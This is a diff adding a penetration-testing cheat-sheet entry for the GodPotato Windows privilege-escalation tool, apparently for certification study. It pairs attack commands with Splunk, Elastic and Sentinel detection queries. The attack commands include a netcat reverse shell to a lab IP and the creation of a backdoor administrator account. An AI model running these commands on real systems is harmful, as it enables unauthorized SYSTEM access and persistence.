@@ -1,0 +1,98 @@
+{
+  "id": "privesc-godpotato",
+  "name": "GodPotato - Universal Windows Potato Privilege Escalation",
+  "command": "GodPotato.exe -cmd \"cmd /c whoami\"",
+  "description": "GodPotato works on Windows Server 2012-2022 and Windows 8-11 by exploiting DCOM/RPCSS to escalate from service accounts with SeImpersonatePrivilege to SYSTEM. Unlike older potatoes, it does not rely on specific Windows versions or BITS/PrintSpooler. The most reliable current potato for modern Windows.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Post-Exploitation",
+  "subcategory": "Privilege Escalation",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "BeichenDream/GodPotato",
+  "tags": [
+    "godpotato",
+    "potato",
+    "seimpersonate",
+    "privesc",
+    "dcom",
+    "system",
+    "service-account"
+  ],
+  "mitre": [
+    "T1134.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHEN TO USE ===\nYou have a shell as a service account with SeImpersonatePrivilege:\n  whoami /priv\n  # Look for: SeImpersonatePrivilege - Enabled\n  # Common accounts: IIS AppPool, MSSQL, service accounts\n\n=== BASIC USAGE ===\n  GodPotato.exe -cmd \"cmd /c whoami\"\n  # Output: nt authority\\system\n\n=== REVERSE SHELL ===\n  GodPotato.exe -cmd \"cmd /c powershell -e <base64_payload>\"\n  # Or:\n  GodPotato.exe -cmd \"cmd /c C:\\temp\\nc.exe <ip> <port> -e cmd.exe\"\n\n=== ADD ADMIN USER ===\n  GodPotato.exe -cmd \"net user hacker Password123! /add\"\n  GodPotato.exe -cmd \"net localgroup administrators hacker /add\"\n\n=== POTATO FAMILY ===\n- GodPotato: Works on all modern Windows (2012-2022, 8-11)\n- PrintSpoofer: Uses print spooler (may be disabled)\n- JuicyPotato: Windows Server 2016/2019 (needs CLSID)\n- SweetPotato: Combines multiple techniques\n- RoguePotato: Needs outbound TCP\n- All require SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
+  "examples": [
+    {
+      "label": "Execute command as SYSTEM",
+      "command": "GodPotato.exe -cmd \"cmd /c whoami\""
+    },
+    {
+      "label": "Reverse shell as SYSTEM",
+      "command": "GodPotato.exe -cmd \"cmd /c C:\\temp\\nc.exe 10.10.14.5 4444 -e cmd.exe\""
+    },
+    {
+      "label": "Check for SeImpersonatePrivilege",
+      "command": "whoami /priv | findstr Impersonate"
+    }
+  ],
+  "references": [
+    {
+      "title": "GodPotato",
+      "url": "https://github.com/BeichenDream/GodPotato"
+    },
+    {
+      "title": "MITRE T1134.001",
+      "url": "https://attack.mitre.org/techniques/T1134/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "seimpersonate-printspoofer",
+      "note": "PrintSpoofer alternative when print spooler is running.",
+      "rel": "alternative"
+    },
+    {
+      "id": "seimpersonate-juicypotato",
+      "note": "JuicyPotato for older Windows Server versions.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "GodPotato abuses DCOM/RPCSS to negotiate authentication and impersonate SYSTEM. The SeImpersonatePrivilege token allows the service account to assume any token presented to it.",
+    "prerequisites": "Service account with SeImpersonatePrivilege; GodPotato binary on target.",
+    "impact": "SYSTEM-level code execution from a service account.",
+    "detection": "[MITRE T1134.001] GodPotato process creation; token manipulation events; new process spawned as SYSTEM from service context.",
+    "artifacts": "GodPotato.exe on disk; process creation under service account spawning SYSTEM child; Event 4688 with token elevation.",
+    "splunk_spl": "index=windows EventCode=4688 (NewProcessName=\"*GodPotato*\" OR NewProcessName=\"*potato*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+    "elastic_kql": "process.name:(*GodPotato* OR *potato*) AND process.args:(\"-cmd\")",
+    "sentinel_kql": "DeviceProcessEvents\n| where FileName has_any (\"GodPotato\", \"SweetPotato\", \"JuicyPotato\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+    "sigma_rules": "win_process_creation_potato_privesc",
+    "prevention": "Remove SeImpersonatePrivilege from unnecessary service accounts; use Group Managed Service Accounts; monitor for potato tool signatures.",
+    "sources": [
+      "BeichenDream research",
+      "https://attack.mitre.org/techniques/T1134/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Potato privilege escalation tool execution",
+        "logic": "DeviceProcessEvents\n| where FileName has_any (\"GodPotato\", \"SweetPotato\", \"JuicyPotato\", \"RoguePotato\", \"PrintSpoofer\")\n  or ProcessCommandLine has_any (\"GodPotato\", \"-cmd\", \"SweetPotato\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1134.001"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Renamed binaries will evade filename-based detection",
+        "tuning": "Also monitor for SeImpersonatePrivilege abuse patterns and unexpected SYSTEM child processes from service accounts"
+      }
+    ]
+  }
+}
